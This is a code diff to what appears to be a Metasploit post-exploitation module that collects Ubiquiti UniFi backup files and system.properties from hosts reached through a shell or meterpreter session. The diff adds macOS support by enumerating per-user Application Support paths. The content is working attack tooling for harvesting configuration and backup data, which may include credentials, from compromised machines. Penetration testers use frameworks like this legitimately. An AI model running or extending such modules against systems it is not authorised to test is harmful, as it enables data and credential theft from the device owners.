@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Post
           'zhangyoufu', # git scripts
           'justingist' # git script
         ],
-      'Platform' => [ 'linux', 'win' ],
+      'Platform' => [ 'linux', 'win', 'osx' ],
       'SessionTypes' => %w[shell meterpreter],
       'References' =>
         [
@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows'
       files = session.fs.dir.foreach(d)
-    when 'linux'
+    when 'linux', 'osx'
       files = cmd_exec("ls #{d}").split(/\r\n|\r|\n/)
     end
 
@@ -116,8 +116,8 @@ class MetasploitModule < Msf::Post
       backup_locations = []
       sprop_locations = []
       grab_user_profiles().each do |user|
-        backup_locations.append("#{user['ProfileDir']}\\Ubiquiti Unifi\\data\\backup")
-        sprop_locations.append("#{user['ProfileDir']}\\Ubiquiti UniFi\\data\\system.properties")
+        backup_locations << "#{user['ProfileDir']}\\Ubiquiti Unifi\\data\\backup"
+        sprop_locations << "#{user['ProfileDir']}\\Ubiquiti UniFi\\data\\system.properties"
       end
     when 'linux'
       # https://help.ubnt.com/hc/en-us/articles/226218448-UniFi-How-to-Configure-Auto-Backup
@@ -127,6 +127,14 @@ class MetasploitModule < Msf::Post
       ]
 
       sprop_locations = ['/var/lib/unifi/system.properties'] #default location on 5.10.19 on ubuntu 18.04
+    when 'osx'
+      # https://github.com/rapid7/metasploit-framework/pull/11548#issuecomment-472568795
+      backup_locations = []
+      sprop_locations = []
+      get_users.each do |user|
+        backup_locations << "/Users/#{user}/Library/Application Support/UniFi/data/backup"
+        sprop_locations  << "/Users/#{user}/Library/Application Support/Unifi/data/system.properties"
+      end      
     end
 
     # read system.properties
